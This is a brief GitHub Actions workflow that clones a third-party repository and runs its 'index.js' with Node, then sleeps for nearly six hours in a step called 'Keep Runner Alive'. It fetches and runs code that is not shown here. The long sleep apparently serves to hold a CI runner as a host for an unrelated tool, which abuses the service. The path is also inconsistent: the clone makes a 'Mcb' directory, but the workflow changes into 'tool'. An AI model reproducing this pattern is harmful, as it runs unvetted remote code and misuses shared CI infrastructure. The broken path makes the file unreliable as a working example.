name: Git Tool Runner
on:
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Clone and Run Tool
        run: |
          git clone https://github.com/hungdz2890909-rgb/Mcb.git
          cd tool
          node index.js
      - name: Keep Runner Alive
        run: sleep 21000